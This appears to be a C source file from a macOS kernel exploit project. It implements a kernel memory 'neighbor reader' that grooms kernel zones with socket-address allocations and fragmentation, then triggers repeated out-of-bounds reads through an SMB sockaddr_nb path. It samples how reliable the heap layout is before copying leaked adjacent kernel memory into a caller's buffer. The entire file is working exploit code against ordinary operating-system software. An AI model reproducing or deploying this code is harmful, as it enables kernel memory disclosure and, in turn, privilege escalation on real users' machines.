//
//  neighbor_reader.c
//  kmem_xepg
//
//  Created by admin on 12/20/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libproc.h>

#include <sys/un.h>
#include <sys/errno.h>
#include <dispatch/dispatch.h>

#include <xe/util/log.h>
#include <xe/util/assert.h>
#include <xe/util/dispatch.h>
#include <xe/util/binary.h>

#include "zkext_neighbor_reader.h"
#include "kmem_neighbor_reader.h"
#include "macos_params.h"

#include "../xnu/saddr_allocator.h"
#include "../smb/client.h"

#define MAX_TRIES 25

#define SMB_FD_COUNT 10
#define SMB_NUM_CLEANUP_ATTEMPTS 16

#define NUM_SAMPLES_FOR_PROBABILITY 50
#define CUTOFF_PROBABILITY 0.9


struct kmem_zkext_neighbor_reader {
    xnu_saddr_allocator_t pad_start_allocator;
    xnu_saddr_allocator_t reader_allocator;
    xnu_saddr_allocator_t pad_end_allocator;
    kmem_neighbor_reader_t kmem_neighbor_reader;
    
    enum {
        STATE_CREATED,
        STATE_USED,
    } state;
    
    struct sockaddr_in smb_addr;
};

void kmem_neighbor_reader_init_saddr_allocators(kmem_zkext_neighour_reader_t reader) {
    xe_assert(reader->pad_start_allocator == NULL);
    xe_assert(reader->reader_allocator == NULL);
    xe_assert(reader->pad_end_allocator == NULL);
    reader->pad_start_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 8);
    reader->reader_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 72);
    reader->pad_end_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 8);
}

kmem_zkext_neighour_reader_t kmem_zkext_neighbor_reader_create(const struct sockaddr_in* smb_addr) {
    kmem_zkext_neighour_reader_t reader = malloc(sizeof(struct kmem_zkext_neighbor_reader));
    bzero(reader, sizeof(struct kmem_zkext_neighbor_reader));
    
    reader->kmem_neighbor_reader = kmem_neighbor_reader_create(smb_addr);
    reader->smb_addr = *smb_addr;
    kmem_neighbor_reader_init_saddr_allocators(reader);
    
    reader->state = STATE_CREATED;
    return reader;
}

double kmem_zkext_neighbor_reader_check(kmem_zkext_neighour_reader_t reader, uint8_t zone_size, uint8_t addr_len) {
    int num_overwritten = ((int)addr_len - 1) / 64;
    int total_size = (num_overwritten + 1) * 64;
    uint8_t to_read = total_size - offsetof(struct sockaddr_nb, snb_name) - 6;
    xe_assert_cond(total_size, <=, UINT8_MAX);
    
    char* buffer = malloc(2048);
    int num_hits = 0;
    
    for (int i=0; i<NUM_SAMPLES_FOR_PROBABILITY; i++) {
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        
        dispatch_async(xe_dispatch_queue(), ^() {
            kmem_neighbor_reader_read(reader->kmem_neighbor_reader, sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), 64, zone_size, to_read, buffer, 2048);
            dispatch_semaphore_signal(sem);
        });
        
        if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 3 * 1000000000ULL))) {
            reader->kmem_neighbor_reader = kmem_neighbor_reader_create(&reader->smb_addr);
            xe_log_warn("kmem neighbor read timed out");
            continue;
        }
        
        uint32_t total_bytes_read = *((uint32_t*)buffer);
        xe_assert_cond(total_bytes_read, >=, to_read + 1);
        
        uint8_t first_segment_size = buffer[4];
        xe_assert_cond(first_segment_size, ==, to_read);
        
        int bytes_to_skip = 64 - offsetof(struct sockaddr_nb, snb_name);
        
        _Bool is_hit = TRUE;
        for (int i=0; i<num_overwritten; i++) {
            struct sockaddr_un un;
            memcpy(&un, &buffer[4 + bytes_to_skip + i * 64], sizeof(struct sockaddr_un));
            if (un.sun_len != 64 || un.sun_family != AF_LOCAL) {
                is_hit = FALSE;
                break;
            }
        }
        
        if (is_hit) {
            num_hits++;
        }
    }
    
    free(buffer);
    return (double)num_hits / (double)NUM_SAMPLES_FOR_PROBABILITY;
}

int kmem_zkext_neighbor_reader_read(kmem_zkext_neighour_reader_t reader, uint8_t zone_size, char* data, size_t data_size) {
    xe_assert_cond(data_size, <=, zone_size);
    xe_assert_cond(reader->state, ==, STATE_CREATED);
    xe_assert_cond(zone_size, >=, 64);
    xe_assert_cond(zone_size, <, 128);
    
    reader->state = STATE_USED;
    xnu_saddr_allocator_allocate(reader->pad_start_allocator);
    xnu_saddr_allocator_allocate(reader->reader_allocator);
    xnu_saddr_allocator_fragment(reader->reader_allocator, 8);
    xnu_saddr_allocator_allocate(reader->pad_end_allocator);
    
    for (int i=0; i<MAX_TRIES; i++) {
        double probability = kmem_zkext_neighbor_reader_check(reader, zone_size, zone_size * 2);
        if (probability < 0.9) {
            xe_log_debug("skipping read due to low success probability of %.2f", probability);
            continue;
        }
        
        char* buffer = malloc(2048);
        uint8_t snb_name = zone_size + zone_size - offsetof(struct sockaddr_nb, snb_name) + 2;
        int bytes_to_skip = zone_size - offsetof(struct sockaddr_nb, snb_name);
        
        kmem_neighbor_reader_read(reader->kmem_neighbor_reader, sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), zone_size * 2, zone_size, snb_name, buffer, 2048);
        
        uint32_t total_bytes_read = *((uint32_t*)buffer);
        xe_assert_cond(total_bytes_read, >=, snb_name);
        
        uint8_t first_segment_len = buffer[4];
        xe_assert_cond(first_segment_len, ==, snb_name);
        
        memcpy(data, &buffer[4 + bytes_to_skip], data_size);
        
        free(buffer);
        goto done;
    }
    
    return EAGAIN;
    
done:
    return 0;
}

void kmem_zkext_neighbor_reader_reset(kmem_zkext_neighour_reader_t reader) {
    xe_assert(reader->state == STATE_USED);
    xnu_saddr_allocator_destroy(&reader->pad_start_allocator);
    xnu_saddr_allocator_destroy(&reader->reader_allocator);
    xnu_saddr_allocator_destroy(&reader->pad_end_allocator);
    kmem_neighbor_reader_init_saddr_allocators(reader);
    reader->state = STATE_CREATED;
}

void kmem_zkext_neighbor_reader_destroy(kmem_zkext_neighour_reader_t* reader_p) {
    kmem_zkext_neighour_reader_t reader = *reader_p;
    xnu_saddr_allocator_destroy(&reader->pad_start_allocator);
    xnu_saddr_allocator_destroy(&reader->reader_allocator);
    xnu_saddr_allocator_destroy(&reader->pad_end_allocator);
    kmem_neighbor_reader_destroy(&reader->kmem_neighbor_reader);
    free(reader);
    *reader_p = NULL;
}
